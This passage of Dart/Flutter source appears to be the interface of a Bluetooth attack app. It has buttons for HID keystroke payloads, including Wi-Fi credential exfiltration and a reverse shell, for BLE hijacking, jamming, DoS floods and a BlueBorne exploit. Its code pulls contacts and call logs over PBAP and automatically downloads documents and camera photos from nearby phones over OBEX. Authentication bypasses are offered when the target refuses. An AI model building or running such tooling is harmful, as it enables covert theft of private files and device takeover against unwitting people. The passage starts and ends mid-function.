                _saveState(); // Guardar selección
              },
              child: Card(margin: const EdgeInsets.only(bottom: 12), child: Padding(padding: const EdgeInsets.all(16), child: Row(children: [
                Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withOpacity(0.05), borderRadius: BorderRadius.circular(12)), child: Icon(device['isBeacon'] == true ? Icons.sensors : Icons.bluetooth, color: isSelected ? Colors.indigoAccent : Colors.white24, size: 24)),
                const SizedBox(width: 16),
                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)), 
                  Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace'))
                ])),
                if (isSelected) const Icon(Icons.check_circle, color: Colors.greenAccent, size: 20),
              ]))),
            );
          },
        );
  }

  Widget _buildHidTab() {
    return ListView(padding: const EdgeInsets.all(16), children: [
      _buildSectionTitle('INYECCIÓN HID', 'Keyboard emulation payloads'),
      const SizedBox(height: 20),
      _buildAttackCard('WINDOWS: NOTEPAD', 'Prueba básica', Colors.blue, () => _attack('hid', script: 'notepad'), type: 'hid'),
      _buildAttackCard('WINDOWS: WIFI', 'Exfiltrar red', Colors.orange, () => _attack('hid', script: 'wifi'), type: 'hid'),
      _buildAttackCard('MACOS: TERMINAL', 'Abrir consola', Colors.purple, () => _attack('hid', script: 'terminal'), type: 'hid'),
      _buildAttackCard('LINUX: REVERSE', 'Remote Shell', Colors.red, () => _attack('hid', script: 'reverse'), type: 'hid'),
    ]);
  }

  Widget _buildBtleJackTab() {
    return ListView(padding: const EdgeInsets.all(16), children: [
      _buildSectionTitle('BTLEJACK CORE', 'Exploits avanzados de BLE'),
      const SizedBox(height: 20),
      _buildAttackCard('SCAN', 'Enumeración', Colors.blue, () => _attack('btlejack', command: 'scan'), type: 'btlejack'),
      _buildAttackCard('SNIFF', 'Captura de paquetes', Colors.purple, () => _attack('btlejack', command: 'sniff'), type: 'btlejack'),
      _buildAttackCard('HIJACK', 'Takeover de sesión', Colors.red, () => _attack('btlejack', command: 'hijack'), type: 'btlejack'),
      _buildAttackCard('JAM', 'Interrupción RF', Colors.deepOrange, () => _attack('btlejack', command: 'jam'), type: 'btlejack'),
    ]);
  }

  Widget _buildDosTab() {
    return ListView(padding: const EdgeInsets.all(16), children: [
      _buildSectionTitle('ATAQUES DoS', 'Denegación de servicio'),
      const SizedBox(height: 20),
      _buildAttackCard('GATT FLOOD', 'Saturación', Colors.red, () => _attack('dos', command: 'gatt_flood'), type: 'dos'),
      _buildAttackCard('L2CAP FLOOD', 'Buffer Crash', Colors.deepOrange, () => _attack('dos', command: 'l2cap_flood'), type: 'dos'),
      _buildAttackCard('MTU CRASH', 'Invalid MTU', Colors.redAccent, () => _attack('dos', command: 'mtu_crash'), type: 'dos'),
    ]);
  }

  Widget _buildAiTab() {
    return ListView(padding: const EdgeInsets.all(16), children: [
      // Panel de datos recolectados del objetivo
      if (_collectedData.isNotEmpty) ...[
        _buildDataPanel(),
        const SizedBox(height: 16),
      ],
      // SDP Service Discovery
      _buildSectionTitle('DESCUBRIMIENTO SDP', 'Servicios expuestos sin pairing'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.search, Colors.grey, null)
      else
        _buildExploitCard('🔍 SDP DISCOVER', 'Descubrir todos los servicios', Icons.search, Colors.cyanAccent, () => _sdpDiscover()),
      if (_sdpServices.isNotEmpty) ...[
        const SizedBox(height: 12),
        _buildSDPResultsPanel(),
      ],
      const SizedBox(height: 16),
      // PBAP Profile Extraction
      _buildSectionTitle('EXTRACCION PBAP', 'Contactos e historial de llamadas'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.contacts, Colors.grey, null)
      else ...[
        _buildExploitCard('📇 EXTRAER CONTACTOS', 'Phone Book Access - telecom.pb', Icons.contacts, Colors.orange, () => _pbapExtract('contacts')),
        _buildExploitCard('📞 HISTORIAL LLAMADAS', 'Incoming/Outgoing/Missed calls', Icons.phone, Colors.deepOrange, () => _pbapExtract('call_history')),
        _buildExploitCard('📋 EXTRAER TODO', 'Contactos + historial completo', Icons.folder_shared, Colors.amber, () => _pbapExtract('all')),
      ],
      if (_pbapContacts.isNotEmpty) ...[
        const SizedBox(height: 12),
        _buildPBAPResultsPanel(),
      ],
      const SizedBox(height: 16),
      // OPP File Push
      _buildSectionTitle('OPP FILE PUSH', 'Enviar archivos al objetivo'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.upload_file, Colors.grey, null)
      else
        _buildExploitCard('📤 PUSH FILE', 'Enviar archivo via OBEX OPP', Icons.upload_file, Colors.purple, () => _oppPushFile()),
      const SizedBox(height: 16),
      // OBEX File Exfiltration - OBJETIVO FINAL
      _buildSectionTitle('EXTRACCION DE ARCHIVOS', 'BlueSnarfing - OBEX FTP'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildObexCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Colors.grey, null)
      else
        _buildObexCard('📂 ESCANEAR ARCHIVOS', 'Conectar via OBEX FTP', Colors.green, () => _obexScan()),
      if (_obexFiles.isNotEmpty) ...[
        const SizedBox(height: 12),
        Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: Colors.green[900]!.withOpacity(0.2),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
                  const SizedBox(width: 8),
                  Text('${_obexFiles.length} archivos encontrados', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                  const Spacer(),
                  TextButton.icon(
                    icon: const Icon(Icons.download, size: 14),
                    label: const Text('EXPLORAR', style: TextStyle(fontSize: 11)),
                    style: TextButton.styleFrom(foregroundColor: Colors.greenAccent),
                    onPressed: () => _openFileBrowser(),
                  ),
                ],
              ),
              const SizedBox(height: 8),
              ..._obexFiles.take(10).map((f) => Padding(
                padding: const EdgeInsets.only(bottom: 2),
                child: Row(
                  children: [
                    Icon(f['type'] == 'directory' ? Icons.folder : Icons.insert_drive_file, color: f['type'] == 'directory' ? Colors.amber : Colors.cyanAccent, size: 12),
                    const SizedBox(width: 4),
                    Expanded(
                      child: Text(f['name']?.toString() ?? '?', style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis),
                    ),
                    Text(f['size']?.toString() ?? '0', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                  ],
                ),
              )),
              if (_obexFiles.length > 10)
                Padding(
                  padding: const EdgeInsets.only(top: 4),
                  child: Text('... y ${_obexFiles.length - 10} más', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                ),
            ],
          ),
        ),
      ],
      const SizedBox(height: 16),
      // AUTHENTICATION BYPASS TECHNIQUES (OffensiveCon 2025)
      _buildSectionTitle('AUTH BYPASS', 'OffensiveCon 2025 - Bluetooth Auth Bypass'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.lock_open, Colors.grey, null)
      else ...[
        _buildExploitCard(
          '⚡ QUICK CONNECT RACE',
          'Race condition: L2CAP connect vs policy check',
          Icons.timer,
          Colors.redAccent,
          () => _bypassQuickConnect(),
        ),
        _buildExploitCard(
          '🎭 MAC SPOOF TRUST',
          'Impersonate a bonded device by MAC',
          Icons.masks,
          Colors.deepPurple,
          () => _bypassSpoofDevice(),
        ),
        _buildExploitCard(
          '🔓 OBEX TRUST ABUSE',
          'Exploit missing OBEX profile-level auth',
          Icons.lock_reset,
          Colors.orange,
          () => _bypassOBEXTrust(),
        ),
      ],
      const SizedBox(height: 16),
      // RESULTS DASHBOARD - Shows all extracted data
      if (_hasResults()) ...[
        _buildSectionTitle('📊 RESULTS DASHBOARD', 'Datos extraídos de ataques'),
        const SizedBox(height: 12),
        _buildResultsDashboard(),
        const SizedBox(height: 16),
      ],
      // ADVANCED EXPLOITS
      _buildSectionTitle('ADVANCED EXPLOITS', 'Full attack suite'),
      const SizedBox(height: 12),
      if (_selectedDevice == null)
        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.security, Colors.grey, null)
      else
        ListView(
          shrinkWrap: true,
          physics: const NeverScrollableScrollPhysics(),
          children: [
            _buildExploitCard('🦠 BLUEBORNE', 'CVE-2017-1000251 - Stack RCE', Icons.bug_report, Colors.red, () => _blueBorneAttack()),
            const SizedBox(height: 8),
            _buildExploitCard('📡 MIRROR PROFILE', 'Clone GATT database', Icons.content_copy, Colors.teal, () => _mirrorProfile()),
            const SizedBox(height: 8),
            _buildExploitCard('💉 AT INJECTION', 'AT commands via HFP', Icons.terminal, Colors.brown, () => _atInjection()),
            const SizedBox(height: 8),
            _buildExploitCard('🔎 FULL VULN SCAN', 'Complete security assessment', Icons.shield, Colors.indigo, () => _fullScan()),
            const SizedBox(height: 8),
            _buildExploitCard('🎭 BT SPOOFING', 'Clone device identity', Icons.fingerprint, Colors.pink, () => _btSpoofing()),
            const SizedBox(height: 8),
            _buildExploitCard('⌨️ HID INJECT', 'Direct keystroke injection', Icons.keyboard, Colors.lime, () => _hidInject()),
            const SizedBox(height: 8),
            _buildExploitCard('📥 DOWNLOAD FILE', 'Get file via OBEX', Icons.file_download, Colors.cyan, () => _downloadFile()),
          ],
        ),
      const SizedBox(height: 16),
      _buildSectionTitle('IA VULN ASSESSMENT', 'Inferencia TFLite'),
      const SizedBox(height: 20),
      if (_discoveryData.isNotEmpty) ...[
        SmartSuggestionPanel(
          discoveryData: _discoveryData,
          onCommandSelected: (cmd) {
            if (cmd.contains(':')) {
              final parts = cmd.split(':');
              final type = parts[0];
              final subCmd = parts.length > 1 ? parts[1] : '';
              
              // Mapear tipos del SmartSuggestionPanel a handlers reales
              String actualType = type;
              String actualCmd = subCmd;
              
              if (type == 'sdp') { actualType = 'sdp_discover'; actualCmd = 'scan'; }
              if (type == 'file') { actualType = 'file_exfil'; actualCmd = 'scan'; }
              if (type == 'vuln') {
                if (subCmd.contains('obex') || subCmd.contains('ftp')) { actualType = 'file_exfil'; actualCmd = 'scan'; }
                else if (subCmd.contains('at') || subCmd.contains('injection')) { actualType = 'at_injection'; actualCmd = ''; }
                else if (subCmd.contains('ble') || subCmd.contains('reconnection')) { actualType = 'dos'; actualCmd = 'gatt_flood'; }
                else { actualType = 'full_scan'; actualCmd = 'scan'; }
              }
              if (type == 'ble') { actualType = 'btlejack'; actualCmd = subCmd.contains('enum') ? 'scan' : subCmd; }
              if (type == 'image') { actualType = 'file_exfil'; actualCmd = 'scan'; }
              if (type == 'terminal') { actualType = 'at_injection'; actualCmd = ''; }
              
              _attack(actualType, command: actualCmd.isEmpty ? subCmd : actualCmd);
            } else {
              String type = 'btlejack';
              if (cmd.contains('flood') || cmd.contains('mtu') || cmd.contains('dos')) type = 'dos';
              if (cmd.contains('hid') || cmd.contains('notepad') || cmd.contains('inject')) type = 'hid';
              if (cmd.contains('terminal') || cmd.contains('at_')) type = 'at_injection';
              if (cmd.contains('obex') || cmd.contains('file') || cmd.contains('pbap')) type = 'file_exfil';
              if (cmd.contains('sdp') || cmd.contains('discover')) type = 'sdp_discover';
              if (cmd.contains('bypass') || cmd.contains('quick') || cmd.contains('spoof') || cmd.contains('trust')) type = 'bypass';
              if (cmd.contains('blueborne')) type = 'blueborne';
              if (cmd.contains('mirror') || cmd.contains('clone')) type = 'mirror_profile';
              if (cmd.contains('scan') || cmd.contains('sniff') || cmd.contains('hijack') || cmd.contains('jam')) type = 'btlejack';
              _attack(type, command: cmd);
            }
          },
          isLoading: false,
          successRates: _successRates,
        ),
        const SizedBox(height: 20),
      ],
      _buildAiModelCard('CLASSIFIER', 'Identidad', '99.3%'),
      _buildAiModelCard('CVE_DETECTOR', 'CVE Analysis', 'ACTIVE'),
      _buildAiModelCard('PREDICTOR', 'Confidence', 'ACTIVE'),
    ]);
  }

  Widget _buildDataPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.green[900]!.withOpacity(0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
              const SizedBox(width: 8),
              Text('DATOS RECOLECTADOS: ${_collectedData.length}', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          ..._collectedData.take(20).map((d) => Padding(
            padding: const EdgeInsets.only(bottom: 2),
            child: Text(d, style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace')),
          )),
        ],
      ),
    );
  }

  Widget _buildObexCard(String title, String subtitle, Color color, VoidCallback? onTap) {
    return Card(
      child: ListTile(
        leading: Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.cloud_download, color: color, size: 24)),
        title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
        subtitle: Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
        trailing: onTap != null ? Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withOpacity(0.5))), child: Icon(Icons.bolt, color: color, size: 16)) : null,
        onTap: onTap,
      ),
    );
  }

  Future<void> _obexScan() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📂 OBEX Scan → $displayName');
    _appendLog('⏳ Conectando vía OBEX FTP...');

    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'file_exfil',
        command: 'scan',
      );

      if (result['success'] == true) {
        final files = result['files'] as List? ?? [];
        final rawFiles = files.map<Map<String, dynamic>>((f) => Map<String, dynamic>.from(f as Map)).toList();

        if (mounted) {
          setState(() {
            _obexFiles = rawFiles;
            _collectedData.add('📂 [$displayName] ${rawFiles.length} archivos encontrados via OBEX FTP');
          });
          _appendLog('✅ OBEX: ${rawFiles.length} archivos encontrados');
          
          // Auto-download important files AND photos from subdirectories
          final importantFiles = rawFiles.where((f) {
            final name = (f['name']?.toString() ?? '').toLowerCase();
            return name.endsWith('.vcf') || name.endsWith('.txt') || name.endsWith('.csv') || 
                   name.endsWith('.json') || name.endsWith('.xml') || name.endsWith('.log');
          }).toList();
          
          // Also scan common photo directories: DCIM/Camera, Pictures, Screenshots
          final photoDirs = ['DCIM/Camera', 'DCIM', 'Pictures', 'Screenshots'];
          final photoFiles = <Map<String, dynamic>>[];
          
          for (final dir in photoDirs) {
            try {
              final dirResult = await _exploitService.executeAttack(
                deviceAddress: _selectedDevice!['address'],
                type: 'file_exfil_dir',
                command: dir,
              );
              if (dirResult['success'] == true) {
                final dirFiles = (dirResult['files'] as List? ?? [])
                    .map<Map<String, dynamic>>((f) => {
                      ...Map<String, dynamic>.from(f as Map),
                      'path': '$dir/${f['name']}', // Store full path for download
                    })
                    .toList();
                
                // Filter to photos/videos only
                final photos = dirFiles.where((f) {
                  final name = (f['name']?.toString() ?? '').toLowerCase();
                  return name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') || 
                         name.endsWith('.mp4') || name.endsWith('.gif') || name.endsWith('.webp') ||
                         name.endsWith('.bmp') || name.endsWith('.heic');
                }).toList();
                
                photoFiles.addAll(photos);
                _appendLog('  📁 $dir: ${photos.length} fotos/videos encontrados');
              }
            } catch (e) {
              _appendLog('  ❌ $dir: no accesible');
            }
          }
          
          if (photoFiles.isNotEmpty) {
            _appendLog('📸 ${photoFiles.length} fotos/videos encontrados en subdirectorios');
          }
          
          final allDownloadable = [...importantFiles, ...photoFiles];
          
          if (importantFiles.isNotEmpty) {
            _appendLog('📥 Descargando ${importantFiles.length} archivos importantes automáticamente...');
            int downloaded = 0;
            for (final file in importantFiles) {
              final fileName = file['name']?.toString() ?? '';
              if (fileName.isEmpty) continue;
              
              try {
                final dlResult = await _exploitService.downloadFile(
                  _selectedDevice!['address'],
                  fileName,
                );
                if (dlResult['success'] == true) {
                  downloaded++;
                  final size = dlResult['size'] ?? 0;
                  _appendLog('  ✅ $fileName ($size bytes)');
                  _collectedData.add('📥 [$displayName] Descargado: $fileName ($size bytes)');
                }
              } catch (e) {
                _appendLog('  ❌ $fileName: $e');
              }
            }
            
            if (downloaded > 0) {
              _appendLog('✅ OBEX: $downloaded/${importantFiles.length} archivos descargados a /sdcard/Download/');
              _collectedData.add('📥 [$displayName] $downloaded archivos descargados a Descargas');
            }
          }
          
          // Download photos from subdirectories
          if (photoFiles.isNotEmpty) {
            _appendLog('📸 Descargando ${photoFiles.length} fotos/videos...');
            int photosDownloaded = 0;
            for (final photo in photoFiles) {
              final photoPath = photo['path']?.toString() ?? photo['name']?.toString() ?? '';
              if (photoPath.isEmpty) continue;
              
              try {
                final dlResult = await _exploitService.downloadFile(
                  _selectedDevice!['address'],
                  photoPath,
                );
                if (dlResult['success'] == true) {
                  photosDownloaded++;
                  final size = dlResult['size'] ?? 0;
                  _appendLog('  📸 ${photo['name']} ($size bytes)');
                  _collectedData.add('📸 [$displayName] Foto descargada: ${photo['name']} ($size bytes)');
                }
              } catch (e) {
                _appendLog('  ❌ ${photo['name']}: $e');
              }
            }
            
            if (photosDownloaded > 0) {
              _appendLog('✅ Fotos: $photosDownloaded/${photoFiles.length} descargadas a /sdcard/Download/');
              _collectedData.add('📸 [$displayName] $photosDownloaded fotos descargadas a Descargas');
            }
          }
          
          _saveState(); // Persist OBEX file list and download results
          
          final totalDownloaded = (importantFiles.isNotEmpty ? importantFiles.length : 0) + (photoFiles.isNotEmpty ? photoFiles.length : 0);
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('📂 ${rawFiles.length} archivos, ${totalDownloaded} descargados (docs+fotos)', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.green[900],
              duration: const Duration(seconds: 5),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        final msg = result['message']?.toString() ?? '';
        _appendLog('❌ OBEX fallido: $msg');
        
        // Si es fallo de auth, sugerir bypass
        if (msg.toLowerCase().contains('auth') || msg.toLowerCase().contains('denied') || msg.toLowerCase().contains('reject') || msg.toLowerCase().contains('fail')) {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Text('🔒 Acceso denegado. Intentar bypass?', style: TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                    const SizedBox(height: 4),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: [
                        TextButton.icon(
                          icon: const Icon(Icons.flash_on, size: 14),
                          label: const Text('Quick Connect', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.redAccent),
                          onPressed: () { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassQuickConnect(); },
                        ),
                        TextButton.icon(
                          icon: const Icon(Icons.lock_reset, size: 14),
                          label: const Text('Trust Abuse', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.orange),
                          onPressed: () { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassOBEXTrust(); },
                        ),
                      ],
                    ),
                  ],
                ),
                backgroundColor: Colors.orange[900],
                duration: const Duration(seconds: 6),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      }
    } catch (e) {
      _appendLog('💥 OBEX Error: $e');
    }
  }

  void _openFileBrowser() {
    if (_selectedDevice == null) return;
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => FileBrowserScreen(device: _selectedDevice!),
      ),
    );
  }

  // ========== SDP DISCOVERY ==========

  Future<void> _sdpDiscover() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔍 SDP Discover → $displayName');
    _appendLog('⏳ Descubriendo servicios sin pairing...');

    try {
      final result = await _exploitService.sdpDiscover(_selectedDevice!['address']);

      if (result['success'] == true) {
        final services = (result['services'] as List? ?? [])
            .map<Map<String, dynamic>>((s) => Map<String, dynamic>.from(s as Map))
            .toList();

        if (mounted) {
          setState(() {
            _sdpServices = services;
            _collectedData.add('🔍 [$displayName] ${services.length} servicios descubiertos via SDP');
          });
          _appendLog('✅ SDP: ${services.length} servicios encontrados');
          _saveState(); // Persist SDP results
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('🔍 ${services.length} servicios descubiertos en $displayName', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.cyan[900],
              duration: const Duration(seconds: 3),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ SDP fallido: ${result['message']}');
      }
    } catch (e) {
      _appendLog('💥 SDP Error: $e');
    }
  }

  // ========== PBAP EXTRACTION ==========

  Future<void> _pbapExtract(String extractType) async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📇 PBAP Extract ($extractType) → $displayName');
    _appendLog('⏳ Conectando via PBAP profile...');

    try {
      final result = await _exploitService.pbapExtract(
        _selectedDevice!['address'],
        extractType: extractType,
      );

      if (result['success'] == true) {
        if (mounted) {
          setState(() {
            // Handle contacts
            if (result.containsKey('contacts')) {
              final contacts = (result['contacts'] as List? ?? [])
                  .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                  .toList();
              _pbapContacts = contacts;
              _collectedData.add('📇 [$displayName] ${contacts.length} contactos extraidos via PBAP');
            }
            // Handle call history
            if (result.containsKey('calls')) {
              final calls = (result['calls'] as List? ?? [])
                  .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                  .toList();
              _pbapCalls = calls;
              _collectedData.add('📞 [$displayName] ${calls.length} llamadas extraidas via PBAP');
            }
          });
          final contactCount = result['contactCount'] ?? result['count'] ?? 0;
          final callCount = result['callCount'] ?? 0;
          _appendLog('✅ PBAP: $contactCount contactos, $callCount llamadas extraidas');
          _saveState(); // Persist PBAP extraction results
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('📇 $contactCount contactos, $callCount llamadas extraidas de $displayName', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.orange[900],
              duration: const Duration(seconds: 3),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        final msg = result['message']?.toString() ?? '';
        _appendLog('❌ PBAP fallido: $msg');
        
        // Si es fallo de auth, sugerir bypass
        if (msg.toLowerCase().contains('auth') || msg.toLowerCase().contains('denied') || msg.toLowerCase().contains('reject') || msg.toLowerCase().contains('fail') || msg.toLowerCase().contains('connection')) {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Text('🔒 PBAP rechazado. Intentar bypass?', style: TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                    const SizedBox(height: 4),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: [
                        TextButton.icon(
                          icon: const Icon(Icons.flash_on, size: 14),
                          label: const Text('Quick Connect', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.redAccent),
                          onPressed: () { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassQuickConnect(); },
                        ),
                        TextButton.icon(
                          icon: const Icon(Icons.lock_reset, size: 14),
                          label: const Text('Trust Abuse', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.orange),
                          onPressed: () { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassOBEXTrust(); },
                        ),
                      ],
                    ),
                  ],
                ),
                backgroundColor: Colors.orange[900],
                duration: const Duration(seconds: 6),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      }
    } catch (e) {
      _appendLog('💥 PBAP Error: $e');
    }
  }

  // ========== OPP FILE PUSH ==========

  Future<void> _oppPushFile() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);

    // Show file picker dialog
    final selectedPath = await showDialog<String>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Seleccionar archivo'),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _buildFileOption('/storage/emulated/0/Download/test.txt', 'Downloads/test.txt'),
            _buildFileOption('/storage/emulated/0/DCIM/Camera/photo.jpg', 'DCIM/photo.jpg'),
            _buildFileOption('/storage/emulated/0/Documents/doc.pdf', 'Documents/doc.pdf'),
            const SizedBox(height: 8),
            const Text('O ingresa ruta personalizada:', style: TextStyle(color: Colors.white70, fontSize: 12)),
            const SizedBox(height: 8),
            TextField(
              decoration: const InputDecoration(
                hintText: '/ruta/personalizada/archivo.txt',
                border: OutlineInputBorder(),
                contentPadding: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              ),
              style: const TextStyle(fontSize: 12),
              onSubmitted: (value) {
                Navigator.pop(context, value);
              },
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancelar'),
          ),
        ],
      ),
    );

    if (selectedPath == null || selectedPath.isEmpty) return;

    _appendLog('📤 OPP Push → $displayName ($selectedPath)');
    _appendLog('⏳ Enviando archivo via OBEX OPP...');

    try {
      final result = await _exploitService.oppPush(_selectedDevice!['address'], selectedPath);

      if (result['success'] == true) {
        _appendLog('✅ OPP: Archivo enviado - ${result['fileName']} (${result['fileSize']} bytes)');
        _collectedData.add('📤 [$displayName] Archivo enviado: ${result['fileName']} (${result['fileSize']} bytes)');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('📤 Archivo enviado: ${result['fileName']} (${result['fileSize']} bytes)', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.purple[900],
              duration: const Duration(seconds: 3),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ OPP fallido: ${result['message']}');
      }
    } catch (e) {
      _appendLog('💥 OPP Error: $e');
    }
  }

  Widget _buildFileOption(String path, String label) {
    return ListTile(
      dense: true,
      contentPadding: EdgeInsets.zero,
      leading: const Icon(Icons.insert_drive_file, size: 16, color: Colors.cyanAccent),
      title: Text(label, style: const TextStyle(color: Colors.white, fontSize: 12)),
      subtitle: Text(path, style: const TextStyle(color: Colors.white38, fontSize: 9)),
      onTap: () => Navigator.pop(context, path),
    );
  }

  // ========== AUTHENTICATION BYPASS HANDLERS ==========

  Future<void> _bypassQuickConnect() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('⚡ Quick Connect Race → $displayName');
    _appendLog('⏳ Attempting race condition attack...');

    try {
      final result = await _exploitService.bypassQuickConnect(
        _selectedDevice!['address'],
      );

      if (result['success'] == true) {
        _appendLog('✅ BYPASS SUCCESS! Response: ${result['responseCode']}');
        _collectedData.add('⚡ [$displayName] Quick Connect bypass succeeded (${result['method']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('⚡ Auth bypass succeeded on $displayName!', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.red[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ Quick Connect bypass failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 Quick Connect Error: $e');
    }
  }

  Future<void> _bypassSpoofDevice() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    final targetMac = _selectedDevice!['address']?.toString() ?? '';
    _appendLog('🎭 MAC Spoof Trust → $displayName ($targetMac)');
    _appendLog('⏳ Attempting to impersonate trusted device...');

    try {
      final result = await _exploitService.bypassSpoofDevice(targetMac);

      if (result['success'] == true) {
        _appendLog('✅ SPOOF SUCCESS! Trust level: ${result['trustLevel']}');
        _collectedData.add('🎭 [$displayName] MAC spoof succeeded (${result['trustLevel']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('🎭 Device trust established: ${result['trustLevel']}', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.deepPurple[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ MAC spoof failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 MAC Spoof Error: $e');
    }
  }

  Future<void> _bypassOBEXTrust() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔓 OBEX Trust Abuse → $displayName');
